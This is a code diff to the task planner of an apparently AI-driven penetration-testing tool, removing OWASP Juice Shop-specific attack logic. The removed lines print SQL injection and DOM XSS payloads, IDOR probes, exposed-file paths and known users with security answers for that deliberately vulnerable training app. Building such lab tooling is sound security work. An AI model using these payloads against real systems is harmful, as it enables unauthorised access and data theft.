@@ -9,23 +9,13 @@ from dataclasses import dataclass
 
 from .session import Task, TaskStatus
 
-# Import Juice Shop knowledge
-try:
-    from app.knowledge.juice_shop import (
-        JUICE_SHOP_VULNS, JUICE_SHOP_ENDPOINTS, ATTACK_STRATEGIES,
-        get_attack_plan, is_juice_shop
-    )
-    JUICE_SHOP_AVAILABLE = True
-except ImportError:
-    JUICE_SHOP_AVAILABLE = False
-
 
 # Planning prompt template
 PLANNING_PROMPT = """You are an expert penetration tester AI assistant. Your job is to break down user requests into specific, executable tasks.
 
 TARGET: {target}
 USER REQUEST: {request}
-{target_knowledge}
+
 AVAILABLE TOOLS:
 {tools}
 
@@ -103,14 +93,10 @@ class TaskPlanner:
         # Build context string
         context_str = self._format_context(context)
 
-        # Build target-specific knowledge
-        target_knowledge = self._get_target_knowledge(context)
-
         # Create planning prompt
         prompt = PLANNING_PROMPT.format(
             target=target,
             request=request,
-            target_knowledge=target_knowledge,
             tools=tool_descriptions,
             context=context_str
         )
@@ -167,29 +153,6 @@ class TaskPlanner:
 
         return "\n".join(lines) if lines else "No additional context available."
 
-    def _get_target_knowledge(self, context: Dict[str, Any]) -> str:
-        """Get target-specific knowledge for the prompt"""
-        if not JUICE_SHOP_AVAILABLE or not context.get("is_juice_shop"):
-            return ""
-
-        return """
-🍊 TARGET IDENTIFIED: OWASP Juice Shop (Known Vulnerable Application)
-
-KNOWN ATTACK VECTORS:
-- SQL Injection: /rest/user/login (email: admin'--), /rest/products/search (q: ')) OR 1=1--)
-- XSS: /#/search?q=<iframe src="javascript:alert('xss')"> (DOM XSS)
-- IDOR: /rest/basket/{id} (try IDs 1-10), /api/Users/{id}
-- Sensitive Files: /ftp (directory listing), /ftp/package.json.bak, /metrics
-- Admin Panel: /administration (no auth required)
-
-KNOWN USERS:
-- admin@juice-sh.op (SQL injection bypass)
-- jim@juice-sh.op (security answer: Samuel)
-- bender@juice-sh.op (security answer: Stop'n'Drop)
-
-PRIORITY: Use these known working attack vectors first for quick wins!
-"""
-
     def _parse_plan_response(self, response: str) -> List[Task]:
         """Parse LLM response into Task objects"""
         tasks = []
@@ -238,10 +201,6 @@ PRIORITY: Use these known working attack vectors first for quick wins!
         """
         Rule-based fallback planning when LLM unavailable
         """
-        # Check if this is OWASP Juice Shop
-        if JUICE_SHOP_AVAILABLE and context.get("is_juice_shop"):
-            return self._juice_shop_plan(target, request, context)
-
         tasks = []
         request_lower = request.lower()
 
@@ -339,122 +298,6 @@ PRIORITY: Use these known working attack vectors first for quick wins!
             success=True,
             tasks=tasks,
             reasoning=f"Fallback plan: {len(tasks)} tasks created based on request keywords"
-        )
-
-    def _juice_shop_plan(
-        self,
-        target: str,
-        request: str,
-        context: Dict[str, Any]
-    ) -> PlanResult:
-        """
-        Generate optimized attack plan for OWASP Juice Shop
-        """
-        tasks = []
-        attack_plan = get_attack_plan(target)
-
-        # Phase 1: Reconnaissance (always first)
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Check /main.js for hardcoded secrets",
-            tool_name="http_request",
-            parameters={"url": f"{target}/main.js", "method": "GET"},
-            priority=1
-        ))
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Enumerate /ftp directory for sensitive files",
-            tool_name="directory_list",
-            parameters={"url": f"{target}/ftp"},
-            priority=2
-        ))
-
-        # Phase 2: SQL Injection attacks (known working)
-        sqli_payloads = JUICE_SHOP_VULNS["sql_injection"]["payloads"]
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="SQL injection on login - Admin bypass with admin'--",
-            tool_name="test_sqli",
-            parameters={
-                "url": f"{target}/rest/user/login",
-                "method": "POST",
-                "payload": {"email": "admin'--", "password": "x"}
-            },
-            priority=10
-        ))
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="SQL injection on search - ')) OR 1=1--",
-            tool_name="test_sqli",
-            parameters={
-                "url": f"{target}/rest/products/search",
-                "param": "q",
-                "payload": "')) OR 1=1--"
-            },
-            priority=11
-        ))
-
-        # Phase 3: XSS attacks (DOM-based)
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="DOM XSS on search via iframe injection",
-            tool_name="test_xss",
-            parameters={
-                "url": f"{target}/#/search",
-                "param": "q",
-                "payload": "<iframe src=\"javascript:alert('xss')\">"
-            },
-            priority=20
-        ))
-
-        # Phase 4: Broken Access Control (IDOR)
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="IDOR on baskets - access other users' baskets",
-            tool_name="test_idor",
-            parameters={
-                "url": f"{target}/rest/basket/{{id}}",
-                "id_range": [1, 10]
-            },
-            priority=30
-        ))
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Access admin panel without authentication",
-            tool_name="http_request",
-            parameters={
-                "url": f"{target}/administration",
-                "method": "GET"
-            },
-            priority=31
-        ))
-
-        # Phase 5: Sensitive Data Exposure
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Download package.json.bak from FTP",
-            tool_name="http_request",
-            parameters={
-                "url": f"{target}/ftp/package.json.bak",
-                "method": "GET"
-            },
-            priority=40
-        ))
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Check Prometheus metrics exposure",
-            tool_name="http_request",
-            parameters={
-                "url": f"{target}/metrics",
-                "method": "GET"
-            },
-            priority=41
-        ))
-
-        return PlanResult(
-            success=True,
-            tasks=tasks,
-            reasoning=f"Juice Shop detected! Using specialized attack plan with {len(tasks)} optimized tasks targeting known vulnerabilities."
         )
 
     async def replan(
